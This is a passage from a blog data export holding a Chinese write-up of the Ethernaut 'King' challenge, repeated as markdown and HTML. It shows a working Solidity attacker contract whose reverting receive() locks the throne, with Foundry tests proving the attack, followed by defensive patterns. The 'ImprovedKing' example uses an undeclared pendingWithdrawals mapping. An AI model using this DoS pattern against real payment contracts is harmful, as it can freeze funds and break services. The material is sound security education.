创建关卡实例\n        address payable levelInstance = payable(ethernaut.createLevelInstance{value: 1 ether}(kingFactory));\n        King instance = King(levelInstance);\n        \n        // 检查初始状态\n        uint256 initialPrize = instance.prize();\n        address initialKing = instance._king();\n        \n        // 部署攻击合约\n        KingAttacker attacker = new KingAttacker{value: initialPrize + 1}(levelInstance);\n        \n        // 执行攻击：成为 king\n        attacker.attack{value: initialPrize + 1}();\n        \n        // 验证攻击成功\n        assertEq(instance._king(), address(attacker));\n        \n        // 尝试有人超越我们（应该失败）\n        vm.expectRevert();\n        (bool success, ) = levelInstance.call{value: initialPrize + 2}(\"\");\n        assertFalse(success);\n        \n        // 验证我们仍然是 king\n        assertEq(instance._king(), address(attacker));\n        \n        // 这个关卡无法正常提交，因为我们破坏了游戏机制\n        // 但这正是关卡想要演示的攻击效果\n    }\n}\n```\n\n### 关键攻击步骤\n\n1. **分析当前 prize**：确定需要多少 ETH 成为 king\n2. **部署攻击合约**：合约的 `receive()` 函数会 revert\n3. **成为 king**：发送足够的 ETH\n4. **锁定王位**：任何后续尝试都会因为 transfer 失败而回滚\n\n```solidity\n// 部署攻击合约\nKingAttacker attacker = new KingAttacker{value: initialPrize + 1}(levelInstance);\n\n// 发送 ETH 成为 king\nattacker.attack{value: initialPrize + 1}();\n\n// 验证攻击成功\nassertEq(instance._king(), address(attacker));\n```\n\n## 🛡️ 防御措施\n\n### 1. 使用 Pull Payment 模式\n\n```solidity\n// ❌ 不安全：Push Payment\ncontract VulnerableKing {\n    address public king;\n    uint public prize;\n    \n    receive() external payable {\n        require(msg.value >= prize);\n        payable(king).transfer(msg.value);  // 可能失败\n        king = msg.sender;\n        prize = msg.value;\n    }\n}\n\n// ✅ 安全：Pull Payment\ncontract SecureKing {\n    address public king;\n    uint public prize;\n    mapping(address => uint) public pendingWithdrawals;\n    \n    receive() external payable {\n        require(msg.value >= prize);\n        \n        // 记录待提取金额\n        if (king != address(0)) {\n            pendingWithdrawals[king] += prize;\n        }\n        \n        king = msg.sender;\n        prize = msg.value;\n    }\n    \n    // 让用户自己提取资金\n    function withdraw() public {\n        uint amount = pendingWithdrawals[msg.sender];\n        require(amount > 0, \"No funds to withdraw\");\n        \n        pendingWithdrawals[msg.sender] = 0;\n        payable(msg.sender).transfer(amount);\n    }\n}\n```\n\n### 2. 使用 call 并处理失败\n\n```solidity\ncontract ImprovedKing {\n    address public king;\n    uint public prize;\n    \n    receive() external payable {\n        require(msg.value >= prize);\n        \n        // 使用 call 并处理失败\n        if (king != address(0)) {\n            (bool success, ) = payable(king).call{value: prize}(\"\");\n            if (!success) {\n                // 记录失败的支付，让用户手动提取\n                pendingWithdrawals[king] += prize;\n            }\n        }\n        \n        king = msg.sender;\n        prize = msg.value;\n    }\n}\n```\n\n### 3. 实现紧急停止机制\n\n```solidity\ncontract SafeKing {\n    address public king;\n    uint public prize;\n    bool public paused;\n    address public owner;\n    \n    modifier onlyOwner() {\n        require(msg.sender == owner);\n        _;\n    }\n    \n    modifier whenNotPaused() {\n        require(!paused);\n        _;\n    }\n    \n    function pause() public onlyOwner {\n        paused = true;\n    }\n    \n    function unpause() public onlyOwner {\n        paused = false;\n    }\n    \n    receive() external payable whenNotPaused {\n        // 正常逻辑\n    }\n}\n```\n\n## 🔧 相关工具和技术\n\n### DoS 攻击检测\n\n```solidity\n// 检测合约是否能接收 ETH\nfunction canReceiveEther(address target) public returns (bool) {\n    (bool success, ) = target.call{value: 1 wei}(\"\");\n    return success;\n}\n```\n\n### Gas 限制分析\n\n```bash\n# 使用 forge 分析 Gas 使用\nforge test --gas-report\n\n# 检查 transfer vs call Gas 消耗\ncast estimate --value 1000000000000000000 <CONTRACT_ADDRESS> \"receive()\"\n```\n\n## 🎯 总结\n\n**核心概念**:\n- `send` 和 `transfer` 现在已被弃用，即使是 `call`，使用时最好按照检查-效果-交互模式调用\n- 外部调用必须谨慎使用，必须正确处理错误\n- Push Payment 模式容易受到 DoS 攻击\n\n**攻击向量**:\n- 通过拒绝接收 ETH 来破坏支付流程\n- 利用 `transfer` 失败时的回滚特性\n- 成为永久的 king，破坏游戏机制\n\n**防御策略**:\n- 使用 Pull Payment 模式\n- 正确处理外部调用失败\n- 实现紧急停止和恢复机制\n- 避免依赖外部调用的成功\n\n---\n\n## 🔗 相关链接\n\n- **[系列目录: Ethernaut Foundry Solutions](/2025/01/25/ethernaut-foundry-solutions-series/)**\n- **[上一关: Level 8 - Vault](/2025/01/25/ethernaut-level-08-vault/)**\n- **[下一关: Level 10 - Re-entrancy](/2025/01/25/ethernaut-level-10-reentrancy/)**\n- **[GitHub 项目](https://github.com/XuHugo/Ethernaut-Foundry-Solutions)**\n\n","slug":"ethernaut-level-09-king","published":1,"comments":1,"layout":"post","photos":[],"_id":"cmfc7zbp7000sbf5q9cik2wel","content":"<h1 id=\"🎯-Ethernaut-Level-9-King-拒绝服务攻击\"><a href=\"#🎯-Ethernaut-Level-9-King-拒绝服务攻击\" class=\"headerlink\" title=\"🎯 Ethernaut Level 9: King - 拒绝服务攻击\"></a>🎯 Ethernaut Level 9: King - 拒绝服务攻击</h1><blockquote>\n<p><strong>关卡链接</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/9\">Ethernaut Level 9 - King</a><br><strong>攻击类型</strong>: 拒绝服务攻击 (DoS)<br><strong>难度</strong>: ⭐⭐⭐⭐☆</p>\n</blockquote>\n<h2 id=\"📋-挑战目标\"><a href=\"#📋-挑战目标\" class=\"headerlink\" title=\"📋 挑战目标\"></a>📋 挑战目标</h2><p>谁出资更高的时候，谁就成为 king，目标是让自己成为 king 之后，别人无法夺取王位。换句话说，我们必须成为王者并一直保持国王，然后打破游戏。</p>\n<p><img src=\"https://ethernaut.openzeppelin.com/imgs/BigLevel9.svg\" alt=\"King Requirements\"></p>\n<h2 id=\"🔍-漏洞分析\"><a href=\"#🔍-漏洞分析\" class=\"headerlink\" title=\"🔍 漏洞分析\"></a>🔍 漏洞分析</h2><h3 id=\"transfer-函数的特性\"><a href=\"#transfer-函数的特性\" class=\"headerlink\" title=\"transfer() 函数的特性\"></a>transfer() 函数的特性</h3><p>我们需要理解 <code>transfer</code>（现在基本被弃用）是如何在 Solidity 中工作的：</p>\n<ul>\n<li>如果 <code>transfer</code> 失败，此函数抛出错误，但不返回布尔值</li>\n<li>这意味着如果 <code>transfer</code> 失败，交易将恢复</li>\n<li>Gas 限制为 2300，不足以执行复杂逻辑</li>\n</ul>\n<h3 id=\"关键漏洞代码\"><a href=\"#关键漏洞代码\" class=\"headerlink\" title=\"关键漏洞代码\"></a>关键漏洞代码</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">receive() external payable &#123;</span><br><span class=\"line\">    require(msg.value &gt;= prize || msg.sender == owner);</span><br><span class=\"line\">    payable(king).transfer(msg.value);  // 易受攻击的点</span><br><span class=\"line\">    king = msg.sender;</span><br><span class=\"line\">    prize = msg.value;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"攻击向量\"><a href=\"#攻击向量\" class=\"headerlink\" title=\"攻击向量\"></a>攻击向量</h3><p>我们可以利用 <code>transfer()</code> 函数失败时会回滚的特性：</p>\n<ol>\n<li>部署一个合约成为 king</li>\n<li>合约不定义 <code>receive()</code> 或 <code>fallback()</code> 函数</li>\n<li>或者在 <code>receive()</code> 函数中直接 revert</li>\n<li>这样合约将无法接收 ETH，阻止任何人成为新的 king</li>\n</ol>\n<h2 id=\"💻-Foundry-实现\"><a href=\"#💻-Foundry-实现\" class=\"headerlink\" title=\"💻 Foundry 实现\"></a>💻 Foundry 实现</h2><h3 id=\"攻击合约代码\"><a href=\"#攻击合约代码\" class=\"headerlink\" title=\"攻击合约代码\"></a>攻击合约代码</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;../src/Ethernaut.sol&quot;;</span><br><span class=\"line\">import &quot;../src/levels/KingFactory.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract KingAttacker &#123;</span><br><span class=\"line\">    King instance;</span><br><span class=\"line\"></span><br><span class=\"line\">    constructor(address payable _king) payable &#123;</span><br><span class=\"line\">        instance = King(_king);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function attack() public payable &#123;</span><br><span class=\"line\">        (bool success, ) = address(instance).call&#123;value: msg.value&#125;(&quot;&quot;);</span><br><span class=\"line\">        require(success, &quot;Attack failed&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 关键：拒绝接收 ETH</span><br><span class=\"line\">    receive() external payable &#123;</span><br><span class=\"line\">        revert(&quot;I will always be the king!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract KingTest is Test &#123;</span><br><span class=\"line\">    Ethernaut ethernaut;</span><br><span class=\"line\">    KingFactory kingFactory;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        ethernaut = new Ethernaut();</span><br><span class=\"line\">        kingFactory = new KingFactory();</span><br><span class=\"line\">        ethernaut.registerLevel(kingFactory);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function testKingExploit() public &#123;</span><br><span class=\"line\">        // 创建关卡实例</span><br><span class=\"line\">        address payable levelInstance = payable(ethernaut.createLevelInstance&#123;value: 1 ether&#125;(kingFactory));</span><br><span class=\"line\">        King instance = King(levelInstance);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 检查初始状态</span><br><span class=\"line\">        uint256 initialPrize = instance.prize();</span><br><span class=\"line\">        address initialKing = instance._king();</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 部署攻击合约</span><br><span class=\"line\">        KingAttacker attacker = new KingAttacker&#123;value: initialPrize + 1&#125;(levelInstance);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 执行攻击：成为 king</span><br><span class=\"line\">        attacker.attack&#123;value: initialPrize + 1&#125;();</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 验证攻击成功</span><br><span class=\"line\">        assertEq(instance._king(), address(attacker));</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 尝试有人超越我们（应该失败）</span><br><span class=\"line\">        vm.expectRevert();</span><br><span class=\"line\">        (bool success, ) = levelInstance.call&#123;value: initialPrize + 2&#125;(&quot;&quot;);</span><br><span class=\"line\">        assertFalse(success);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 验证我们仍然是 king</span><br><span class=\"line\">        assertEq(instance._king(), address(attacker));</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 这个关卡无法正常提交，因为我们破坏了游戏机制</span><br><span class=\"line\">        // 但这正是关卡想要演示的攻击效果</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"关键攻击步骤\"><a href=\"#关键攻击步骤\" class=\"headerlink\" title=\"关键攻击步骤\"></a>关键攻击步骤</h3><ol>\n<li><strong>分析当前 prize</strong>：确定需要多少 ETH 成为 king</li>\n<li><strong>部署攻击合约</strong>：合约的 <code>receive()</code> 函数会 revert</li>\n<li><strong>成为 king</strong>：发送足够的 ETH</li>\n<li><strong>锁定王位</strong>：任何后续尝试都会因为 transfer 失败而回滚</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 部署攻击合约</span><br><span class=\"line\">KingAttacker attacker = new KingAttacker&#123;value: initialPrize + 1&#125;(levelInstance);</span><br><span class=\"line\"></span><br><span class=\"line\">// 发送 ETH 成为 king</span><br><span class=\"line\">attacker.attack&#123;value: initialPrize + 1&#125;();</span><br><span class=\"line\"></span><br><span class=\"line\">// 验证攻击成功</span><br><span class=\"line\">assertEq(instance._king(), address(attacker));</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"🛡️-防御措施\"><a href=\"#🛡️-防御措施\" class=\"headerlink\" title=\"🛡️ 防御措施\"></a>🛡️ 防御措施</h2><h3 id=\"1-使用-Pull-Payment-模式\"><a href=\"#1-使用-Pull-Payment-模式\" class=\"headerlink\" title=\"1. 使用 Pull Payment 模式\"></a>1. 使用 Pull Payment 模式</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ❌ 不安全：Push Payment</span><br><span class=\"line\">contract VulnerableKing &#123;</span><br><span class=\"line\">    address public king;</span><br><span class=\"line\">    uint public prize;</span><br><span class=\"line\">    </span><br><span class=\"line\">    receive() external payable &#123;</span><br><span class=\"line\">        require(msg.value &gt;= prize);</span><br><span class=\"line\">        payable(king).transfer(msg.value);  // 可能失败</span><br><span class=\"line\">        king = msg.sender;</span><br><span class=\"line\">        prize = msg.value;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// ✅ 安全：Pull Payment</span><br><span class=\"line\">contract SecureKing &#123;</span><br><span class=\"line\">    address public king;</span><br><span class=\"line\">    uint public prize;</span><br><span class=\"line\">    mapping(address =&gt; uint) public pendingWithdrawals;</span><br><span class=\"line\">    </span><br><span class=\"line\">    receive() external payable &#123;</span><br><span class=\"line\">        require(msg.value &gt;= prize);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 记录待提取金额</span><br><span class=\"line\">        if (king != address(0)) &#123;</span><br><span class=\"line\">            pendingWithdrawals[king] += prize;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\">        king = msg.sender;</span><br><span class=\"line\">        prize = msg.value;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 让用户自己提取资金</span><br><span class=\"line\">    function withdraw() public &#123;</span><br><span class=\"line\">        uint amount = pendingWithdrawals[msg.sender];</span><br><span class=\"line\">        require(amount &gt; 0, &quot;No funds to withdraw&quot;);</span><br><span class=\"line\">        </span><br><span class=\"line\">        pendingWithdrawals[msg.sender] = 0;</span><br><span class=\"line\">        payable(msg.sender).transfer(amount);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-使用-call-并处理失败\"><a href=\"#2-使用-call-并处理失败\" class=\"headerlink\" title=\"2. 使用 call 并处理失败\"></a>2. 使用 call 并处理失败</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract ImprovedKing &#123;</span><br><span class=\"line\">    address public king;</span><br><span class=\"line\">    uint public prize;</span><br><span class=\"line\">    </span><br><span class=\"line\">    receive() external payable &#123;</span><br><span class=\"line\">        require(msg.value &gt;= prize);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 使用 call 并处理失败</span><br><span class=\"line\">        if (king != address(0)) &#123;</span><br><span class=\"line\">            (bool success, ) = payable(king).call&#123;value: prize&#125;(&quot;&quot;);</span><br><span class=\"line\">            if (!success) &#123;</span><br><span class=\"line\">                // 记录失败的支付，让用户手动提取</span><br><span class=\"line\">                pendingWithdrawals[king] += prize;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\">        king = msg.sender;</span><br><span class=\"line\">        prize = msg.value;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-实现紧急停止机制\"><a href=\"#3-实现紧急停止机制\" class=\"headerlink\" title=\"3. 实现紧急停止机制\"></a>3. 实现紧急停止机制</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract SafeKing &#123;</span><br><span class=\"line\">    address public king;</span><br><span class=\"line\">    uint public prize;</span><br><span class=\"line\">    bool public paused;</span><br><span class=\"line\">    address public owner;</span><br><span class=\"line\">    </span><br><span class=\"line\">    modifier onlyOwner() &#123;</span><br><span class=\"line\">        require(msg.sender == owner);</span><br><span class=\"line\">        _;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    modifier whenNotPaused() &#123;</span><br><span class=\"line\">        require(!paused);</span><br><span class=\"line\">        _;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function pause() public onlyOwner &#123;</span><br><span class=\"line\">        paused = true;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function unpause() public onlyOwner &#123;</span><br><span class=\"line\">        paused = false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    receive() external payable whenNotPaused &#123;</span><br><span class=\"line\">        // 正常逻辑</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"🔧-相关工具和技术\"><a href=\"#🔧-相关工具和技术\" class=\"headerlink\" title=\"🔧 相关工具和技术\"></a>🔧 相关工具和技术</h2><h3 id=\"DoS-攻击检测\"><a href=\"#DoS-攻击检测\" class=\"headerlink\" title=\"DoS 攻击检测\"></a>DoS 攻击检测</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 检测合约是否能接收 ETH</span><br><span class=\"line\">function canReceiveEther(address target) public returns (bool) &#123;</span><br><span class=\"line\">    (bool success, ) = target.call&#123;value: 1 wei&#125;(&quot;&quot;);</span><br><span class=\"line\">    return success;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Gas-限制分析\"><a href=\"#Gas-限制分析\" class=\"headerlink\" title=\"Gas 限制分析\"></a>Gas 限制分析</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 使用 forge 分析 Gas 使用</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span> --gas-report</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 检查 transfer vs call Gas 消耗</span></span><br><span class=\"line\">cast estimate --value 1000000000000000000 &lt;CONTRACT_ADDRESS&gt; <span class=\"string\">&quot;receive()&quot;</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"🎯-总结\"><a href=\"#🎯-总结\" class=\"headerlink\" title=\"🎯 总结\"></a>🎯 总结</h2><p><strong>核心概念</strong>:</p>\n<ul>\n<li><code>send</code> 和 <code>transfer</code> 现在已被弃用，即使是 <code>call</code>，使用时最好按照检查-效果-交互模式调用</li>\n<li>外部调用必须谨慎使用，必须正确处理错误</li>\n<li>Push Payment 模式容易受到 DoS 攻击</li>\n</ul>\n<p><strong>攻击向量</strong>:</p>\n<ul>\n<li>通过拒绝接收 ETH 来破坏支付流程</li>\n<li>利用 <code>transfer</code> 失败时的回滚特性</li>\n<li>成为永久的 king，破坏游戏机制</li>\n</ul>\n<p><strong>防御策略</strong>:</p>\n<ul>\n<li>使用 Pull Payment 模式</li>\n<li>正确处理外部调用失败</li>\n<li>实现紧急停止和恢复机制</li>\n<li>避免依赖外部调用的成功</li>\n</ul>\n<hr>\n<h2 id=\"🔗-相关链接\"><a href=\"#🔗-相关链接\" class=\"headerlink\" title=\"🔗 相关链接\"></a>🔗 相关链接</h2><ul>\n<li><strong><a href=\"/2025/01/25/ethernaut-foundry-solutions-series/\">系列目录: Ethernaut Foundry Solutions</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-08-vault/\">上一关: Level 8 - Vault</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-10-reentrancy/\">下一关: Level 10 - Re-entrancy</a></strong></li>\n<li><strong><a href=\"https://github.com/XuHugo/Ethernaut-Foundry-Solutions\">GitHub 项目</a></strong></li>\n</ul>\n","more":"<h1 id=\"🎯-Ethernaut-Level-9-King-拒绝服务攻击\"><a href=\"#🎯-Ethernaut-Level-9-King-拒绝服务攻击\" class=\"headerlink\" title=\"🎯 Ethernaut Level 9: King - 拒绝服务攻击\"></a>🎯 Ethernaut Level 9: King - 拒绝服务攻击</h1><blockquote>\n<p><strong>关卡链接</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/9\">Ethernaut Level 9 - King</a><br><strong>攻击类型</strong>: 拒绝服务攻击 (DoS)<br><strong>难度</strong>: ⭐⭐⭐⭐☆</p>\n</blockquote>\n<h2 id=\"📋-挑战目标\"><a href=\"#📋-挑战目标\" class=\"headerlink\" title=\"📋 挑战目标\"></a>📋 挑战目标</h2><p>谁出资更高的时候，谁就成为 king，目标是让自己成为 king 之后，别人无法夺取王位。换句话说，我们必须成为王者并一直保持国王，然后打破游戏。</p>\n<p><img src=\"https://ethernaut.openzeppelin.com/imgs/BigLevel9.svg\" alt=\"King Requirements\"></p>\n<h2 id=\"🔍-漏洞分析\"><a href=\"#🔍-漏洞分析\" class=\"headerlink\" title=\"🔍 漏洞分析\"></a>🔍 漏洞分析</h2><h3 id=\"transfer-函数的特性\"><a href=\"#transfer-函数的特性\" class=\"headerlink\" title=\"transfer() 函数的特性\"></a>transfer() 函数的特性</h3><p>我们需要理解 <code>transfer</code>（现在基本被弃用）是如何在 Solidity 中工作的：</p>\n<ul>\n<li>如果 <code>transfer</code> 失败，此函数抛出错误，但不返回布尔值</li>\n<li>这意味着如果 <code>transfer</code> 失败，交易将恢复</li>\n<li>Gas 限制为 2300，不足以执行复杂逻辑</li>\n</ul>\n<h3 id=\"关键漏洞代码\"><a href=\"#关键漏洞代码\" class=\"headerlink\" title=\"关键漏洞代码\"></a>关键漏洞代码</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">receive() external payable &#123;</span><br><span class=\"line\">    require(msg.value &gt;= prize || msg.sender == owner);</span><br><span class=\"line\">    payable(king).transfer(msg.value);  // 易受攻击的点</span><br><span class=\"line\">    king = msg.sender;</span><br><span class=\"line\">    prize = msg.value;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"攻击向量\"><a href=\"#攻击向量\" class=\"headerlink\" title=\"攻击向量\"></a>攻击向量</h3><p>我们可以利用 <code>transfer()</code> 函数失败时会回滚的特性：</p>\n<ol>\n<li>部署一个合约成为 king</li>\n<li>合约不定义 <code>receive()</code> 或 <code>fallback()</code> 函数</li>\n<li>或者在 <code>receive()</code> 函数中直接 revert</li>\n<li>这样合约将无法接收 ETH，阻止任何人成为新的 king</li>\n</ol>\n<h2 id=\"💻-Foundry-实现\"><a href=\"#💻-Foundry-实现\" class=\"headerlink\" title=\"💻 Foundry 实现\"></a>💻 Foundry 实现</h2><h3 id=\"攻击合约代码\"><a href=\"#攻击合约代码\" class=\"headerlink\" title=\"攻击合约代码\"></a>攻击合约代码</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span 